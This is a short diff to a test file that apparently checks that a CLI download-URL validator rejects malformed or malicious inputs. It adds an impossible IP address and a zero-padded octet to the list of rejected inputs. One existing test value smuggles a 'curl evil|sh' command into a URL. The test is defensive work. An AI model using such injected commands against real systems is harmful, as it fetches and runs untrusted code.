@@ -114,6 +114,8 @@ describe("version", () => {
         "http://100.70.62.92:8700/x.tgz", // the right origin, not a /cli/ path
         "http://100.70.62.92:8700/cli/sub/x.tgz",
         "http://100.70.62.92:8700/cli/a.tgz;curl evil|sh",
+        "http://999.1.1.1/cli/x.tgz", // plain by the regex, refused by the URL parser: no crash either
+        "http://100.70.62.092:8700/cli/x.tgz",
         42,
         undefined,
       ]) {
